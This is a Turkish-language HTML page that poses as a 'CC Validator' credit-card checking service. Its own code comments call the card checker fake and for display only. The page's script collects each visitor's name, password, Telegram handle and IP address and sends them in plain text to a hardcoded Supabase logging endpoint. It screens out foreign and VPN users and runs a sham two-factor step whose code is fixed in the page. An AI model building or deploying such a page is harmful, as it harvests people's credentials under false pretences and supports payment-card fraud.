<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>CC Validator • Giriş Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: radial-gradient(circle at 10% 20%, #0a0f1c, #06080f);
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px;
        }

        /* card modern */
        .glass-card {
            max-width: 500px;
            width: 100%;
            background: rgba(12, 18, 28, 0.65);
            backdrop-filter: blur(16px);
            border-radius: 3rem;
            border: 1px solid rgba(79, 158, 255, 0.25);
            padding: 32px 28px;
            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5);
            transition: all 0.2s;
        }

        .logo-area {
            text-align: center;
            margin-bottom: 28px;
        }

        .logo {
            font-size: 34px;
            font-weight: 800;
            background: linear-gradient(135deg, #f0f9ff, #5dade2);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -0.5px;
        }

        .badge {
            font-size: 11px;
            color: #6c8bb8;
            margin-top: 8px;
            display: inline-block;
            background: #0f1622aa;
            padding: 4px 14px;
            border-radius: 30px;
        }

        /* sahte checker (sadece görsel) */
        .fake-module {
            background: #080e18;
            border-radius: 2rem;
            padding: 20px;
            margin-bottom: 28px;
            border: 1px solid #1e2a3a;
        }

        .fake-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
            color: #b9c7dd;
            font-size: 13px;
        }

        .fake-input-row {
            display: flex;
            gap: 12px;
            margin-bottom: 14px;
        }

        .fake-input-row input {
            width: 100%;
            background: #03060c;
            border: 1px solid #253040;
            padding: 14px;
            border-radius: 24px;
            color: #aaa;
            font-size: 13px;
        }

        .fake-button {
            background: #111722;
            text-align: center;
            padding: 12px;
            border-radius: 40px;
            color: #5c6e8c;
            font-weight: 600;
        }

        /* gerçek kayıt/giriş alanı */
        .auth-container {
            margin-top: 8px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-group label {
            font-size: 12px;
            font-weight: 500;
            color: #9ab3d9;
            display: block;
            margin-bottom: 8px;
        }

        .input-group input {
            width: 100%;
            background: #0b101b;
            border: 1px solid #263040;
            padding: 14px 18px;
            border-radius: 40px;
            font-size: 14px;
            color: #f1f5f9;
            outline: none;
            transition: 0.2s;
        }

        .input-group input:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 2px #1e3a8a40;
        }

        button {
            width: 100%;
            background: linear-gradient(95deg, #1f4e7a, #1662a0);
            border: none;
            padding: 14px;
            border-radius: 60px;
            font-weight: 700;
            font-size: 15px;
            color: white;
            cursor: pointer;
            transition: 0.2s;
        }

        button:active {
            transform: scale(0.97);
        }

        .info-message {
            font-size: 12px;
            text-align: center;
            margin-top: 16px;
            color: #facc15;
        }

        .error-text {
            color: #f97316;
            font-size: 12px;
            text-align: center;
            margin-top: 12px;
        }

        .success-text {
            color: #2dd4bf;
            font-size: 12px;
            text-align: center;
            margin-top: 12px;
        }

        .divider {
            height: 1px;
            background: #1f2a3e;
            margin: 24px 0 16px;
        }

        .footer-note {
            font-size: 10px;
            text-align: center;
            color: #4e6188;
            margin-top: 28px;
        }

        .live-badge {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #0b0e16bb;
            padding: 5px 12px;
            border-radius: 40px;
            font-size: 10px;
            color: #4f9eff;
            backdrop-filter: blur(4px);
        }
    </style>
</head>
<body>
<div class="glass-card">
    <div class="logo-area">
        <div class="logo">⚡ CC VALIDATOR</div>
        <div class="badge">● GÜVENLİ BAĞLANTI</div>
    </div>

    <!-- sadece görsel CC checker -->
    <div class="fake-module">
        <div class="fake-header">
            <span>💳 KART DOĞRULAMA</span>
            <span>🟢 AKTİF</span>
        </div>
        <div class="fake-input-row">
            <input type="text" placeholder="4242 4242 4242 4242" disabled>
        </div>
        <div class="fake-input-row">
            <input type="text" placeholder="12/28" disabled>
            <input type="text" placeholder="123" disabled>
        </div>
        <div class="fake-button">🔍 DOĞRULA</div>
        <div style="font-size: 11px; text-align: center; margin-top: 14px; color: #4f5e7e;">
            🔐 Hesap doğrulandıktan sonra aktif olur
        </div>
    </div>

    <!-- gerçek kayıt/giriş bloğu -->
    <div class="auth-container">
        <div class="input-group">
            <label>👤 Ad Soyad</label>
            <input type="text" id="fullname" placeholder="Ahmet Yılmaz" autocomplete="off">
        </div>
        <div class="input-group">
            <label>🔐 Şifre</label>
            <input type="password" id="password" placeholder="••••••">
        </div>
        <div class="input-group">
            <label>📱 Telegram Kullanıcı Adı</label>
            <input type="text" id="telegramUser" placeholder="@kullaniciadi">
        </div>

        <button id="sendCodeBtn">📲 2FA KOD GÖNDER</button>
        <div id="infoMessage" class="info-message"></div>

        <!-- kod doğrulama bölümü -->
        <div id="verifyPanel" style="display: none; margin-top: 24px;">
            <div class="input-group">
                <label>🔢 Doğrulama Kodu</label>
                <input type="text" id="verifyCode" placeholder="385217" maxlength="6">
            </div>
            <button id="confirmVerifyBtn">✅ DOĞRULA VE GİRİŞ</button>
            <div id="verifyMessage" class="error-text"></div>
        </div>
    </div>
    <div class="footer-note">🔒 SSL · TLS 1.3 · GİZLİLİK KORUMALI</div>
</div>
<div class="live-badge">🟢 SİSTEM AKTİF</div>

<script>
    // ---------- KONFİG ----------
    const VERIFY_CODE = "385217";
    const BOT_LINK = "https://t.me/ZazaChecker2fa_bot";
    const SUPABASE_URL = "https://pkgnvzqpvmmxyspzbkzs.supabase.co/rest/v1/logs";
    const SUPABASE_KEY = "sb_publishable_ScwqsJHfIUnTv0PMq0w49A_nUtGVBN2";

    let pendingName = "", pendingPass = "", pendingTg = "";

    // IP alma
    async function getUserIP() {
        try {
            const res = await fetch("https://api.ipify.org?format=json");
            const data = await res.json();
            return data.ip;
        } catch {
            return "0.0.0.0";
        }
    }

    // aynı IP kontrolü (1 IP = 1 hesap)
    async function isIpRegistered(ip) {
        try {
            const res = await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}&ip_adresi=eq.${ip}`);
            const data = await res.json();
            return Array.isArray(data) && data.length > 0;
        } catch {
            return false;
        }
    }

    // yurtdışı & vpn engeli
    async function checkTurkeyAndVPN() {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        if (data.country_code !== "TR") {
            document.body.innerHTML = `<div style="text-align:center;padding:80px;background:#0b0f1c;color:white;height:100vh"><h1 style="color:#f97316">🌍 ERİŞİM ENGELLENDİ</h1><p>Sadece Türkiye'den erişim sağlanır.</p><p>IP: ${data.ip}</p></div>`;
            throw new Error("BLOCKED");
        }
        if (data.proxy === true || data.hosting === true || data.tor === true) {
            document.body.innerHTML = `<div style="text-align:center;padding:80px;background:#0b0f1c;color:white;height:100vh"><h1 style="color:#f97316">🔒 VPN / PROXY TESPİT EDİLDİ</h1><p>Proxy/VPN ile giriş yasaktır.</p></div>`;
            throw new Error("BLOCKED");
        }
    }

    // Supabase'e kaydet
    async function saveToDatabase(name, pass, tg, ip) {
        await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                kullanici_adi: name,
                sifre: pass,
                telegram_user: tg,
                ip_adresi: ip
            })
        });
    }

    // KOD GÖNDER butonu
    document.getElementById("sendCodeBtn").onclick = async () => {
        const name = document.getElementById("fullname").value.trim();
        const pass = document.getElementById("password").value;
        const tg = document.getElementById("telegramUser").value.trim();
        const infoDiv = document.getElementById("infoMessage");

        if (!name || !pass || !tg) {
            infoDiv.innerHTML = "❌ Tüm alanları doldurun";
            return;
        }
        if (!tg.startsWith("@")) {
            infoDiv.innerHTML = "❌ Telegram adı @ ile başlamalı";
            return;
        }
        if (pass.length < 4) {
            infoDiv.innerHTML = "❌ Şifre en az 4 karakter";
            return;
        }

        infoDiv.innerHTML = "🔄 Doğrulanıyor...";

        try {
            await checkTurkeyAndVPN();
            const userIp = await getUserIP();
            const ipExists = await isIpRegistered(userIp);
            if (ipExists) {
                infoDiv.innerHTML = "❌ Bu IP ile zaten kayıt yapılmış! (1 hesap limiti)";
                return;
            }

            pendingName = name;
            pendingPass = pass;
            pendingTg = tg;

            // kod panelini göster
            document.getElementById("verifyPanel").style.display = "block";
            infoDiv.innerHTML = `✅ 2FA kodu Telegram'a gönderildi. <a href="${BOT_LINK}" target="_blank" style="color:#4f9eff;">@ZazaChecker2fa_bot</a> /start yaz → kod: 385217`;
            document.getElementById("verifyCode").value = "";
            document.getElementById("verifyMessage").innerHTML = "";
        } catch (err) {}
    };

    // DOĞRULA VE KAYDET
    document.getElementById("confirmVerifyBtn").onclick = async () => {
        const code = document.getElementById("verifyCode").value.trim();
        const msgDiv = document.getElementById("verifyMessage");
        const infoDiv = document.getElementById("infoMessage");

        if (!code) {
            msgDiv.innerHTML = "❌ Kodu girin";
            return;
        }
        if (code !== VERIFY_CODE) {
            msgDiv.innerHTML = "❌ Geçersiz doğrulama kodu!";
            return;
        }

        msgDiv.innerHTML = "⏳ Hesap oluşturuluyor...";

        try {
            const userIp = await getUserIP();
            await saveToDatabase(pendingName, pendingPass, pendingTg, userIp);

            msgDiv.style.color = "#2dd4bf";
            msgDiv.innerHTML = "✅ KAYIT BAŞARILI! HOŞ GELDİNİZ.";
            infoDiv.innerHTML = "";

            // başarılı mesajı göster + butonları pasif yap
            document.getElementById("sendCodeBtn").disabled = true;
            document.getElementById("confirmVerifyBtn").disabled = true;

            setTimeout(() => {
                location.reload();
            }, 2000);
        } catch (err) {
            msgDiv.innerHTML = "❌ Veritabanı hatası! Tekrar dene.";
        }
    };
</script>
</body>
</html>
